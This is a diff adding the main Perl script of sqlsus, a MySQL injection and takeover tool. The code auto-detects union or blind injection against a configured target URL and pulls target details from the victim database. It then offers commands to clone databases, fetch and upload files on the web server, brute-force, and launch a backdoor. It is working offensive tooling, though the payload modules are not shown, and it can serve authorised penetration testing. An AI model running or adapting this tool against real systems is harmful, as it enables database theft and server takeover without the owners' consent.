@@ -1,0 +1,483 @@
+#!/usr/bin/perl -w 
+
+# This file is part of sqlsus
+#
+# Copyright (c) 2008-2011 Jérémy Ruffet (sativouf)
+# http://sqlsus.sourceforge.net/
+#
+# Licensed under GPLv3+: GNU GPL version 3 or later
+# See LICENSE file or http://www.gnu.org/licenses/gpl.html
+
+our $RELEASE = "0.7.2";
+
+use strict;
+use lib '/usr/share/sqlsus/lib';
+
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Term::ReadLine;
+use File::Path;
+use Getopt::Long;
+use Time::HiRes qw/sleep/;
+use File::Temp qw/tempfile tempdir/;
+use Pod::Usage;
+use IO::Socket;
+
+use Sqlsus::conf;
+use Sqlsus::functions;
+use Sqlsus::select;
+use Sqlsus::autoconf;
+use Sqlsus::get;
+use Sqlsus::show;
+use Sqlsus::file;
+use Sqlsus::db;
+use Sqlsus::brute;
+use Sqlsus::help;
+use Sqlsus::backdoor;
+use Sqlsus::msg;
+use Sqlsus::clone;
+
+our $internal_request = 0;
+
+our %target;
+our $database;
+our %databases;
+our %privileges;
+our @history;
+our $control_parent;
+our $control_child;
+
+my  $interactive = 1;
+
+##################################
+sub version_info {
+	print "
+              sqlsus version $RELEASE
+
+  Copyright (c) 2008-2011 Jérémy Ruffet (sativouf)
+
+";
+}
+
+##################################
+sub usage {
+	pod2usage;
+	exit 0;
+}
+
+##################################
+sub save_and_exit {
+	my $exit_code = shift;
+
+	&save();
+	$control_child->send('exit');
+	exit $exit_code;
+}
+
+##################################
+sub save {
+	&db::save_vars;
+	if (@history or not $interactive) {
+		&db::query("DELETE FROM history");
+		&db::save_history(@history);
+	}
+}
+
+##################################
+sub interrupt_hit {
+	$main::control_child->send("interrupt +");
+}
+
+##################################
+sub interrupt_reset {
+	$main::control_child->send("interrupt reset");
+}
+
+##################################
+sub is_interrupted {
+	$main::control_child->send("interrupt print");
+	$main::control_child->recv(my $buf, 100);
+	return $buf;
+}
+
+##################################
+sub launch_control_process {
+	my $hits = 0;
+	my $inband_mass_query_fetched = 0;
+	my $interrupt = 0;
+	while (defined $control_parent) {
+		$control_parent->recv(my $buf, 100);
+		next unless $buf;
+#		&msg::info("received : $buf");
+		if ($buf eq 'hits +') {
+			$hits++;
+		} elsif ($buf eq 'hits print') {
+			$control_parent->send($hits);
+		} elsif ($buf eq 'hits reset') {
+			$hits = 0;
+		} elsif ($buf eq 'interrupt +') {
+			$interrupt++;
+			if ($interrupt == 2) {
+				&msg::raw("\n[+] Ctrl-C hit twice, hit again to force sqlsus to exit\n");
+			} elsif ($interrupt >= 3) {
+				rmtree($main::tmp_dir) if $main::tmp_dir;
+				kill -15, $$;
+			}
+		} elsif ($buf eq 'interrupt print') {
+			$control_parent->send($interrupt);
+		} elsif ($buf eq 'interrupt reset') {
+			$interrupt = 0;
+		} elsif ($buf =~ /inband_mass_query_fetched (\d+) (\d+) (\d+)/) {
+			$inband_mass_query_fetched += $1;
+			&select::print_progress($inband_mass_query_fetched, $2, $3, $hits);
+		} elsif ($buf =~ /inband_mass_query_fetched reset/) {
+			$inband_mass_query_fetched = 0;
+		} elsif ($buf =~ /progress print (\d+) (\d+) (\d+)/) {
+			&select::print_progress($1, $2, $3, $hits);
+		} elsif ($buf eq 'exit') {
+			exit;
+		}
+	}
+} 
+
+##################################
+sub target_fill {
+	my @result = &select::query("SELECT " . join(",", (values %conf::target_keys)), 1) or return 0;
+
+	for my $item (keys %conf::target_keys) {
+		$target{$item} = shift @result;
+	}
+	# create hash entry if none exists
+	$databases{$target{database}} = () unless defined $databases{$target{database}};
+	# if current database was never set, set it to what "start" returned
+	$database = $target{database} unless $database;
+
+	if (not &db::query("SELECT * FROM databases WHERE database_name = ?", $database)) {
+		&db::query("INSERT INTO databases VALUES (?,?,?,?)", $database, '','','');
+	}
+
+	$target{user} =~ s/^(.*)\@(.*)$/'$1'\@'$2'/ if $target{user};
+	&show::command("target");
+	return 1;
+}
+
+##################################
+# Let's start the game !
+sub start {
+	if (not $conf::blind) {
+		if (@conf::columns) {
+			&msg::info("UNION columns already set to (" . join (",", @conf::columns) . "), skipping auto-detection... (use \"autoconf select_columns\" to do it anyway)");
+		} else {
+			if (not &autoconf::select_columns()) {
+				&msg::fatal("find_select_columns() FAILED... exiting");
+			}
+			&msg::info("Correct number of columns for UNION : " . scalar @conf::columns . ' (' . join (",", @conf::columns) . ")");
+			if (not grep /1/, @conf::columns) {
+				&msg::fatal("No suitable column found, you should probably go in blind injection mode...exiting");
+			}
+		}
+	} else {
+		&msg::raw("Testing blind mode...\r");
+		if (&select::inject_blind("1") and not &select::inject_blind("0")) {
+			&msg::info("Blind mode test passed successfully");
+		} else {
+			if ($conf::blind == 1) {
+				&msg::error("Blind mode test failed, verify your parameters. (\$blind_string not accurate ?)");
+			} elsif ($conf::blind == 2) {
+				&msg::error("Blind mode test failed, verify your parameters. (\$blind_sleep set too low ? Using time-based injection on a MySQL < 5.0.12 ?)");
+			}
+			&save_and_exit(1);
+		}
+	}
+
+
+	if ($conf::max_url_length > 0) {
+		&msg::info("max_url_length already set to $conf::max_url_length , skipping auto-detection... (use \"autoconf max_sendable\" to do it anyway)");
+	} elsif ($conf::max_inj_length > 0) {
+		&msg::info("max_inj_length already set to $conf::max_inj_length , skipping auto-detection... (use \"autoconf max_sendable\" to do it anyway)");
+	} else {
+		&autoconf::max_sendable;
+	}
+
+	&msg::info("Filling \%target...");
+	&msg::fatal("target_fill() FAILED... exiting") if not &target_fill();
+}
+
+
+##################################
+############# MAIN ###############
+##################################
+
+umask 0077;
+
+&version_info;
+
+########### parse arguments ############
+
+my @input_query;
+
+GetOptions(
+	"help" => sub { &usage() },
+	"version" => sub { exit 0 },
+	"execute=s" => sub { 
+		@input_query = split ';', $_[1]; 
+		$interactive = 0; 
+	},
+	"genconf=s" => sub { 
+		&conf::gen($_[1]); 
+		exit 0 
+	}
+);
+	
+my $conf_file = $ARGV[0];
+
+&usage unless $conf_file;
+
+if (-r "$conf_file") {
+	do "$conf_file";
+} else {
+	print STDERR "Configuration file \"$conf_file\" not readable, exiting..\n";
+	exit 1;
+}
+
+########### init sqlsus ############
+
+&conf::backwards_compatibility();
+
+# auto prefix/append space
+$conf::url_start .= " ";
+$conf::url_end = " " . $conf::url_end;
+
+# URL base path
+our $url_base = $conf::url_start;
+$url_base =~ s#^(https?://[^/]+/).*$#$1#i;
+
+our $html_method = $conf::post ? "POST" : "GET";
+
+$conf::union_select .= " ";
+
+our $server;
+our $port = 80;
+
+if ($conf::url_start =~ m#https?://([^/]*?)(:(\d+))?/.*#) {
+	$server = $1;
+	$port = $3 if defined $3;
+} else {
+	&msg::error("Unable to extract server from url_start, check your configuration file");
+	exit 1;
+}
+
+my ($status, @result);
+our $term = new Term::ReadLine 'kikoolol';
+eval { $term->Attribs->ornaments(0); };
+
+our $browser = LWP::UserAgent->new(agent => $conf::user_agent);
+
+mkpath "$conf::datapath";
+our $logdb = "$conf::datapath/sqlsus-session.$main::server.db";
+our $dumpdbbase = "$conf::datapath/$main::server";
+
+# init and load data from saved session if any
+&db::init_databases;
+@history = &db::query("SELECT command FROM history");
+&db::init_vars;
+&db::load_vars;
+
+&functions::load_proxy_in_browser;
+if ($conf::cred_realm) 	{ $browser->credentials("$server:$port", $conf::cred_realm, $conf::cred_user, $conf::cred_password) }
+
+eval { $main::term->AddHistory(@history) };
+&msg::notice("Terminal does not support AddHistory. Consider installing a real Term::Readline package.") if $@;
+
+$browser->cookie_jar(HTTP::Cookies->new);
+if ($conf::use_cookie_jar and $conf::cookie) {
+	&functions::set_cookie($conf::cookie);
+}
+
+our $tmp_dir = tempdir("/tmp/.sqlsus_XXXXXXXX", CLEANUP => 1 ) or &msg::fatal("Couldn't create temporary directory : $!");
+
+our @backdoor_data = <backdoor::DATA>;
+close backdoor::DATA;
+
+our $pid = $$;
+
+$control_parent =  new IO::Socket::UNIX->new(Local => "$main::tmp_dir/control_parent",
+	Type  => SOCK_DGRAM,
+	Listen   => 10)
+|| die "can't create master hits UNIX socket: $!\n";
+
+$control_child = IO::Socket::UNIX->new(Peer => "$main::tmp_dir/control_parent",
+	Local => "$main::tmp_dir/control_child",
+	Type     => SOCK_DGRAM,
+	Timeout  => 10)
+|| die "could not create hits UNIX socket : $!\n";
+
+$SIG{'INT'} = 'IGNORE';
+
+if (fork()) {
+	$SIG{'INT'} = sub { &functions::interrupt_hit(); };
+	&launch_control_process();
+	exit;
+}
+
+########### main loop ############
+LOOP:
+while (@input_query or defined (my $query = $_ = $term->readline('sqlsus> '))) {
+	&main::interrupt_reset();
+	&functions::hits_reset();
+	
+	unless ($interactive) { $query = $_ = shift @input_query }
+
+	if (/\S/) {
+		# Discard trailing ';', spaces..
+		$query =~ s/^\s*(.*?)\s*;?\s*$/$1/;
+		last if $query =~ /^(exit|quit)$/i;
+
+		if ($query =~ /^replay$/i) { 
+			for (my $i = $#history; $i >= 0; $i--) {
+				if ($history[$i] =~ /^select\s/i) {
+					my $table = &db::query_in_log($history[$i]);
+					&db::drop_table($table) if $table;
+					&msg::info("Replaying : $history[$i]");
+					&select::command($history[$i]);
+					push @history, "replay";
+					&main::interrupt_reset();
+					goto LOOP;
+				}
+			}
+			# No select has been found in command history, but replay was asked
+			&msg::error("No select found in command history, nothing to replay");
+			next;
+		} elsif ($query =~ /^(select)\s+/i and $interactive) {
+			push @history, $query;
+			
+			if (my $table = &db::query_in_log($query)) {
+				&functions::print_table_in_a_box(undef, $main::logdb, $table);
+				&msg::info("Cached result displayed, use \"replay\" to re-execute the last select");
+				next;
+			}
+		}
+		my ($query_type, @query_args_tab) = split /\s+/, $query;
+		my $query_args = join ' ', @query_args_tab;
+		for ($query_type) {
+			if    (/^start$/i)		{ &start }
+			elsif (/^select$/i)		{ &select::command($query) }
+			elsif (/^test$/i)		{ &select::test($query_args) }
+			elsif (/^show$/i)		{ &show::command($query_args) }
+			elsif (/^get$/i)		{ &get::command($query_args) }
+			elsif (/^describe$/i)		{ &show::command("columns $query_args") }
+			elsif (/^set$/i)		{ &functions::set_var($query_args) } 
+			elsif (/^use$/i)		{ &functions::set_var("db $query_args") } 
+			elsif (/^find$/i)		{ &functions::find_tables($query_args) }
+			elsif (/^download$/i)		{ &file::download($query_args) }
+			elsif (/^upload$/i)		{ &file::upload(@query_args_tab) }
+			elsif (/^clone$/i)		{ &clone::command($query_args) }
+			elsif (/^brute$/i)		{ &brute::command($query_args) }
+			elsif (/^autoconf$/i) 		{ &autoconf::command($query_args) }
+			elsif (/^backdoor$/i) 		{ &backdoor::launch() }
+			elsif (/^help$/i) 		{ &help::usage($query_args) }
+			elsif (/^genconf$/i) 		{ &conf::gen($query_args) }
+			elsif (/^!(.*)$/) 		{ system("$1 $query_args") }
+			elsif (/^eval$/i) {
+				eval $query_args if $query_args;
+				print "\n";
+			}
+			else { 
+				&msg::notice("\"$query\" command not implemented"); 
+				next; 
+			}
+			push @history, $query;
+		}
+	} 
+	last if &main::is_interrupted() and not $interactive;
+	last if not $interactive and not $input_query[0];
+	&main::interrupt_reset();
+	&save;
+}
+# and... done.
+print "\n";
+&msg::info("Session saved");
+&save_and_exit(0);
+
+__END__
+
+=head1 NAME
+
+sqlsus - MySQL injection tool
+
+=head1 SYNOPSIS
+
+B<sqlsus> S<[options]> S<[config file]>
+
+ Options:
+     -h, --help                    brief help message
+     -v, --version                 version information
+     -e, --execute <commands>      execute commands and exit
+     -g, --genconf <filename>      generate configuration file
+
+=head1 EXAMPLES
+
+=over 4
+
+=item B<sqlsus> --genconf my.conf
+
+generate my.conf with sqlsus defaults.
+
+=item B<sqlsus> --execute 'start;get db;clone' my.conf
+
+use my.conf and clone the current database.
+
+=item B<sqlsus> my.conf
+
+start sqlsus in interactive mode using my.conf as configuration file.
+
+=back
+
+=head1 DESCRIPTION
+
+B<sqlsus> is a MySQL injection and takeover tool focused on speed and efficiency, optimising the available injection space.
+
+Via a command line interface, you can retrieve the database(s) structure, clone the database(s), inject your own SQL queries (even complex ones), download files from the web server, upload and control a backdoor, and much more...
+
+=head1 OPTIONS
+
+=over 4
+
+=item S<B<-g, --genconf> <filename>>
+
+Generate a configuration file with sqlsus defaults.
+
+=item S<B<-e, --execute> <command[;command;command...]>>
+
+Non interactive mode, sqlsus will execute each command one after another.
+
+=item S<B<-h, --help>>
+
+Print basic help.
+
+=item S<B<-v, --version>>
+
+Print version information.
+
+=back
+
+=head1 SEE ALSO
+
+=over 4
+
+=item sqlsus website: L<http://sqlsus.sourceforge.net/>
+
+=item Inline documentation: type "help" inside sqlsus.
+
+=back
+
+=head1 AUTHOR
+
+Jeremy Ruffet <sativouf@gmail.com>
+
+=head1 COPYRIGHT
+
+Copyright (c) 2008-2011 Jeremy Ruffet. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
+This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
+
+=cut
